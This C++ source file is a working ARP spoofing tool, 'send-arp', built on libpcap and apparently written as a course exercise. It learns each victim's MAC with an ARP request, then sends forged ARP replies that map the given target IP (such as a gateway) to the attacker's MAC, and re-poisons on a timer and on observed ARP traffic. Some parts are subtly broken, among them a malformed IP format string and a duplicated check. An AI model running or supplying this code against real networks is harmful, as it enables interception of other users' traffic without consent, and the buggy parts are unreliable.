#include <cstdio>
#include <time.h>
#include <pcap.h>
#include <unistd.h>
#include <net/if.h>
#include <net/if_arp.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

#define MAC_ALEN 6

#define MAC_ADDR_FMT "%02x:%02x:%02x:%02x:%02x:%02x"
#define MAC_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3], addr[4], addr[5]

int GetMacAddress(const char *ifname, uint8_t *mac_addr){
	struct ifreq ifr;
	int sockfd, ret;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("Fail to get interface MAC address - socket() failed - %m\n");
		close(sockfd);
		return -1;
	}

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFHWADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface MAC address - ioctl(SIOCSIFHWADDR) failed - %m\n");
		close(sockfd);
		return -1;
	}
	memcpy(mac_addr, ifr.ifr_hwaddr.sa_data, MAC_ALEN);
	close(sockfd);

	return 0;
}

void FmtMacAddress(char *fmt_mac_addr,  uint8_t *mac_addr){
	sprintf(fmt_mac_addr,MAC_ADDR_FMT, MAC_ADDR_FMT_ARGS(mac_addr));
}


#define IP_ALEN 4

#define IP_ADDR_FMT "%%d.%d.%d.%d"
#define IP_ADDR_FMT_ARGS(addr) addr[0], addr[1], addr[2], addr[3]

int GetIpAddress(const char *ifname, uint8_t *ip_addr){
	struct ifreq ifr;
	int sockfd, ret;

	sockfd = socket(AF_INET, SOCK_DGRAM, 0);
	if(sockfd < 0){
		printf("Fail to get interface IP address - socket() failed - %m\n");
		close(sockfd);
		return -1;
	}

	strncpy(ifr.ifr_name, ifname, IFNAMSIZ-1);
	ret = ioctl(sockfd, SIOCGIFADDR, &ifr);
	if(ret < 0){
		printf("Fail to get interface IP address - ioctl(SIOCGIFADDR) failed - %m\n");
		close(sockfd);
		return -1;
	}
	struct sockaddr_in* sin = (struct sockaddr_in*)&ifr.ifr_addr;
	memcpy(ip_addr, &sin->sin_addr, sizeof(sin->sin_addr));
	close(sockfd);

	return 0;
}

void FmtIpAddress(char *fmt_ip_addr, uint8_t *ip_addr){
	sprintf(fmt_ip_addr,IP_ADDR_FMT, IP_ADDR_FMT_ARGS(ip_addr));
}

int ArpGetMac(pcap_t *pcap, char *attacker_ip, char *attacker_mac, char *target_ip, char *target_mac){
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);
		
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(attacker_ip));
	packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
	packet.arp_.tip_ = htonl(Ip(target_ip));

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		return EXIT_FAILURE;
	}
	
	while(true){
		struct pcap_pkthdr* header;
		const uint8_t *recv_packet;

		res = pcap_next_ex(pcap, &header, &recv_packet);
		if(res == -1 || res == -2){
			fprintf(stderr,"pcap_next_ex return %d error=%s\n",res, pcap_geterr(pcap));
			return EXIT_FAILURE;
		}
		EthArpPacket* recv = (EthArpPacket*)recv_packet;

		if(ntohs(recv->eth_.type_) != EthHdr::Arp) continue;
		if(ntohs(recv->arp_.op_) != ArpHdr::Reply) continue;
		if(recv->arp_.sip_ != htonl(Ip(target_ip))) continue;
		if(recv->arp_.tip_ != htonl(Ip(attacker_ip))) continue;
		if(recv->arp_.tmac_ != Mac(attacker_mac)) continue;

		strcpy(target_mac, std::string(recv->arp_.smac_).c_str());
		printf("target_mac: %s\n",target_mac);
		break;
	}
	return EXIT_SUCCESS;
}

int ArpSpoof(pcap_t *pcap, const char *ifname,char *sender_ip, char *target_ip){
	uint8_t attacker_mac_addr[6];
	uint8_t attacker_ip_addr[4];
	char attacker_mac[18];
	char attacker_ip[16];
	char sender_mac[18];

	GetMacAddress(ifname, attacker_mac_addr);
	GetIpAddress(ifname, attacker_ip_addr);
	FmtMacAddress(attacker_mac, attacker_mac_addr);
	FmtIpAddress(attacker_ip, attacker_ip_addr);

	if(ArpGetMac(pcap, attacker_ip,attacker_mac,sender_ip,sender_mac) == EXIT_FAILURE) return EXIT_FAILURE;
		
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(sender_mac);
	packet.eth_.smac_ = Mac(attacker_mac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::Size;
	packet.arp_.pln_ = Ip::Size;
	packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(attacker_mac);
	packet.arp_.sip_ = htonl(Ip(target_ip));
	packet.arp_.tmac_ = Mac(sender_mac);
	packet.arp_.tip_ = htonl(Ip(sender_ip));

	int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(pcap));
		return EXIT_FAILURE;
	}
	return EXIT_SUCCESS;
}

bool CheckTime(clock_t *time){
	if(clock() - *time >= CLOCKS_PER_SEC){
		*time = clock();
		return true;
	}
	return false;
}

int Relay(pcap_t *pcap, const char *ifname, char *ip_pair[], int pair_num, clock_t *time){
	while(true){
		if(*time == -1 || CheckTime(time)){
			for(int i=2;i<pair_num;i+=2) ArpSpoof(pcap,ifname,ip_pair[i],ip_pair[i+1]);
			return EXIT_SUCCESS;
		}

		struct pcap_pkthdr* header;
		const uint8_t *recv_packet;

		int res = pcap_next_ex(pcap, &header, &recv_packet);
		if(res == -1 || res == -2){
			fprintf(stderr,"pcap_next_ex return %d error=%s\n",res, pcap_geterr(pcap));
			return EXIT_FAILURE;
		}
		EthArpPacket* recv = (EthArpPacket*)recv_packet;

		if(ntohs(recv->eth_.type_) == EthHdr::Arp && ntohs(recv->eth_.type_) == EthHdr::Arp){
			for(int i=2;i<pair_num;i+=2){
				if(recv->arp_.sip_ == Ip(ip_pair[i]) && recv->arp_.tip_ == Ip(ip_pair[i+1])){
					ArpSpoof(pcap,ifname,ip_pair[i],ip_pair[i+1]);
					return EXIT_SUCCESS;
				}
			}
		}
	}

}

int main(int argc, char* argv[]) {
	if (argc < 4 || argc % 2) {
		usage();
		return EXIT_FAILURE;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (pcap == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		pcap_close(pcap);
		return EXIT_FAILURE;
	}
	
	clock_t time = -1;

	while(true){
		if(Relay(pcap,dev,argv,argc,&time) == EXIT_FAILURE){
			pcap_close(pcap);
			return EXIT_FAILURE;
		}
	}
	
	pcap_close(pcap);
}

